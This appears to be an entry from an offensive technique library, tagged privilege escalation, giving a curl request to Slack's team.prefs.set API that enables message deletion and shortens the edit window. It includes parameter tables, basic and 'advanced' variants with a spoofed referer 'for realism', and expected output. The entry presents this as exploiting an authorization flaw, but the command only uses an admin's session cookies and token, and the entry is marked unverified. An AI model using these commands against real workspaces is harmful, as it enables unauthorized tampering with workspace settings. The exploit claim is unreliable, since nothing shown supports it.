---
id: cmd-uuid-1
data: >-
  curl -X POST 'https://teamname.slack.com/api/team.prefs.set?t=1423146704' -H
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Referer:
  https://teamname.slack.com/admin/settings' -H 'Cookie:
  _ga=GA1.2.630936366.1423056192; a-3204538285=..' -d
  'prefs=%7B%22msg_edit_window_mins%22%3A%221%22%2C%22allow_message_deletion%22%3Atrue%7D&token=xoxs-xxxx&set_active=true&_attempts=1'
tags:
  - api
  - privilege-escalation
  - slack
type: command
output: '{"ok":true,"prefs":{"allow_message_deletion":true}}'
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.776Z'
verified: false
validated: true
submitted: true
---
# slack-team-prefs-set

## Command

```bash
curl -X POST 'https://teamname.slack.com/api/team.prefs.set?t=1423146704' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Referer: https://teamname.slack.com/admin/settings' \
  -H 'Cookie: _ga=GA1.2.630936366.1423056192; a-3204538285=..' \
  -d 'prefs=%7B%22msg_edit_window_mins%22%3A%221%22%2C%22allow_message_deletion%22%3Atrue%7D&token=xoxs-xxxx&set_active=true&_attempts=1'
```

## Description

This curl command sends a POST request to Slack's team preferences API to set the 'allow_message_deletion' to true, exploiting authorization flaws. Use it in authenticated admin sessions to escalate privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `t` | Timestamp for request freshness (e.g., 1423146704) | Yes |
| `prefs` | URL-encoded JSON of preferences (e.g., msg_edit_window_mins:1, allow_message_deletion:true) | Yes |
| `token` | Slack API token (xoxs- format) | Yes |
| `set_active` | Flag to activate settings (true) | Yes |
| `_attempts` | Request attempt counter (1) | No |
| Cookie header | Session cookies from admin login | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://teamname.slack.com/api/team.prefs.set?t=$(date +%s)' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: [cookies]' -d 'prefs=%7B%22allow_message_deletion%22%3Atrue%7D&token=[token]&set_active=true'
```

### Advanced Usage

Include additional preferences and referer for realism:

```bash
curl -X POST 'https://teamname.slack.com/api/team.prefs.set?t=$(date +%s)' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Referer: https://teamname.slack.com/admin/settings' \
  -H 'Cookie: [full cookies]' \
  -d 'prefs=%7B%22msg_edit_window_mins%22%3A%221%22%2C%22allow_message_deletion%22%3Atrue%7D&token=[token]&set_active=true&_attempts=1'
```

## Expected Output

JSON response like {"ok":true,"prefs":{"msg_edit_window_mins":"1","allow_message_deletion":true}}, confirming the setting change.

## Related

- [[procedures/Modify-Slack-Team-Preferences-via-API]]
